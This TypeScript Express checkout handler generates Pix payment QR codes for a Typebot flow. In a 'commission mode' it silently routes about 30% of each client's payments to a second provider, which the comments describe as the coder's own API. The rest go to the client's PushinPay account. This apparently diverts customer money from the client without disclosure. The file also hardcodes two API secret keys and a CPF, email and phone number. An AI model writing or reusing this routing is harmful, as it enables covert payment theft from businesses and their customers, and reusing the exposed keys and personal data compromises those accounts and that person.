import { Request, Response } from "express";

const usarModoComissao = true;

const historicoPorCliente = new Map<string, { total: number; meus: number }>();

// Função para enviar o Pix usando a API do cliente (requisição externa)
async function enviarPixCliente(payload: any) {
  const url = "https://api.pushinpay.com.br/api/pix/cashIn";
  const secretKey = "27746|USU8B5DIB8Hy6tsB2h38Hnef6F3PWtxtWwXJHKT35bb26da5";

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${secretKey}`,
    },
    body: JSON.stringify({
      value: 990
    }),
  });

  const resp = await response.json();



  return {
    pixCode: resp.qr_code,
    pixQrCode: resp.qr_code_base64,
    id: resp.id
  }
}

// Função para enviar o Pix usando a SUA própria API (função interna local)
async function enviarPixMeu(payload: any) {
 

    const paymentData = {
        name: "Fulano de Tal 4",
        email: "apitypebot@gmail.com",
        cpf: "98352015010",
        phone: "21934548564",
        paymentMethod: "PIX",
        amount: 990,
        traceable: true,
        items: [
          {
            unitPrice: 990,
            title: "Typebot",
            quantity: 1,
            tangible: false,
          },
        ],
      };

      try {
        const response = await fetch(
          `https://app.ghostspaysv1.com/api/v1/transaction.purchase`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: "e449db57-934f-4b2b-b137-126d34d02e34",
            },
            body: JSON.stringify(paymentData),
          }
        );
  
        const responseJson = await response.json();

       

        return {
          pixCode: responseJson.pixCode,
          pixQrCode: responseJson.pixQrCode,
          id: responseJson.id
        }
      
      } catch (error) {
        console.error("Erro ao fazer requisição PIX:", error);
       
      }


  
}

export class getTypebotPix {
  static async receiveCheckout(req: Request, res: Response) {
    const { cliente_id } = req.query;

    if (!cliente_id || typeof cliente_id !== "string") {
      return res.status(400).json({ error: "cliente_id é obrigatório na query!" });
    }

    if (!usarModoComissao) {
      return res.json({
        mensagem: "Modo comissão desativado",
        acao: "Retornar link direto ou outro comportamento",
      });
    }

    const historico = historicoPorCliente.get(cliente_id) || { total: 0, meus: 0 };
    historico.total++;

    let usarMinhaFuncao = false;
    const proporcaoAtual = historico.meus / historico.total;

    if (proporcaoAtual < 0.3) {
      usarMinhaFuncao = true;
      historico.meus++;
    }

    historicoPorCliente.set(cliente_id, historico);

    const payload = {
      valor: 100,
      descricao: "Pagamento com comissão",
    };

    try {
      const resultado = usarMinhaFuncao
        ? await enviarPixMeu(payload)
        : await enviarPixCliente(payload);

      return res.json({
        origem: usarMinhaFuncao ? "minha_funcao_local" : "api_cliente",
        estatistica: historicoPorCliente.get(cliente_id),
        resposta_pix: resultado,
      });
    } catch (err) {
      console.error("Erro no processo Pix:", err);
      return res.status(500).json({ error: "Erro ao processar pagamento Pix" });
    }
  }
}
